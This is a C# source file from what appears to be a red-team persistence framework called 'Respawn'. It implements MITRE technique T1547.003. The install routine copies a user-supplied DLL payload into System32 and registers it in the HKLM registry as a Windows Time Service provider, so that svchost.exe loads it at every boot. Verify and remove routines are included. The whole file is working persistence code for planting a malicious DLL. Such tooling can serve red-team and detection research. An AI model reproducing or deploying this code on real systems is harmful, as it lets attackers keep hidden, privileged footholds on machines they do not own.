using Microsoft.Win32;
using Respawn.Core;
using System.Runtime.InteropServices;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.TimeProvider
{
    public class TimeProviderModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "time";
        public string Name        => "Time Providers";
        public string Mitre       => "T1547.003";
        public string Description => "Persist by abusing the Windows Time Service (W32Time), registering a malicious DLL as a custom Time Provider in the system registry so that it automatically loads into the associated `svchost.exe` process during boot.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders";

        // ─── P/Invoke for Reboot Deletion ────────────────────────────────────────

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool MoveFileEx(string lpExistingFileName, string? lpNewFileName, uint dwFlags);

        private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x04;

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 2. TECHNICAL REQUIREMENTS
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  TECHNICAL REQUIREMENTS:");
            // Console.ResetColor();
            // Console.WriteLine("    - DLL MUST export the 'TimeProvOpen' function");
            // // Console.WriteLine("    - DLL will be copied to C:\\Windows\\System32");
            // Console.WriteLine("    - Requires REBOOT or W32Time restart to load");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Internal provider name (e.g. 'NtpSvc')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to target DLL (.dll only)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t time -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t time -a install -n \"NtpSvc\" -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t time -a verify  -n \"NtpSvc\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t time -a remove  -n \"NtpSvc\"");
        }
        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return TimeProviderKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening W32Time registry key. Run as administrator.");

                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing != null)
                    return TechniqueResult.Exists($"Time provider '{ctx.Name}' already registered.");

                // copy DLL to System32
                string dllName    = Path.GetFileName(ctx.Payload);
                string system32   = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string targetPath = Path.Combine(system32, dllName);

                if (!System.IO.File.Exists(targetPath))
                    System.IO.File.Copy(ctx.Payload, targetPath, overwrite: false);

                // create provider subkey
                using var providerKey = baseKey.CreateSubKey(ctx.Name, writable: true);
                if (providerKey == null)
                    return TechniqueResult.Fail($"Failed to create provider subkey '{ctx.Name}'.");

                providerKey.SetValue("DllName", targetPath);
                providerKey.SetValue("Enabled", 1, RegistryValueKind.DWord);
                providerKey.SetValue("InputProvider", 0, RegistryValueKind.DWord);

                return TechniqueResult.Ok(
                    $"Installed time provider '{ctx.Name}' | " +
                    $"DLL copied to: '{targetPath}' | " +
                    $"Reboot required to load into svchost.exe.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Time provider registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove (Updated with Reboot Deletion) ───────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening W32Time registry key. Run as administrator.");

                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing == null)
                    return TechniqueResult.NotFound($"Time provider '{ctx.Name}' not found.");

                // Capture DLL path before deleting registry key
                string? dllPath = existing.GetValue("DllName")?.ToString();
                
                // 1. Delete Registry Entry
                baseKey.DeleteSubKeyTree(ctx.Name);

                // 2. Handle File Deletion
                if (!string.IsNullOrEmpty(dllPath) && System.IO.File.Exists(dllPath))
                {
                    // try
                    // {
                    //     // Try immediate delete
                    //     System.IO.File.Delete(dllPath);
                    // }
                    // catch (System.IO.IOException)
                    // {
                        // File is locked by W32Time (svchost.exe). 
                        // Mark for deletion on next reboot.
                        bool scheduled = MoveFileEx(dllPath, null, MOVEFILE_DELAY_UNTIL_REBOOT);
                        
                        if (scheduled)
                            return TechniqueResult.Ok($"Removed registry for '{ctx.Name}'. DLL is locked but scheduled for deletion on reboot.");
                        else
                            return TechniqueResult.Fail($"Registry removed, but failed to schedule DLL deletion. Error: {Marshal.GetLastWin32Error()}");
                    // }
                }

                return TechniqueResult.Ok($"Removed time provider '{ctx.Name}' and deleted DLL from System32.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Time provider registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening W32Time registry key. Run as administrator.");

                using var providerKey = baseKey.OpenSubKey(ctx.Name);
                if (providerKey == null)
                    return TechniqueResult.NotFound($"Time provider '{ctx.Name}' not found.");

                string? dllPath   = providerKey.GetValue("DllName")?.ToString();
                int     enabled   = (int)(providerKey.GetValue("Enabled") ?? 0);
                bool    dllExists = System.IO.File.Exists(dllPath ?? "");

                return TechniqueResult.Ok(
                    $"Verified time provider '{ctx.Name}' | " +
                    $"DLL: '{dllPath}' | " +
                    $"DLL exists: {dllExists} | " +
                    $"Enabled: {enabled}");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No provider name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "Time provider requires a DLL payload.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}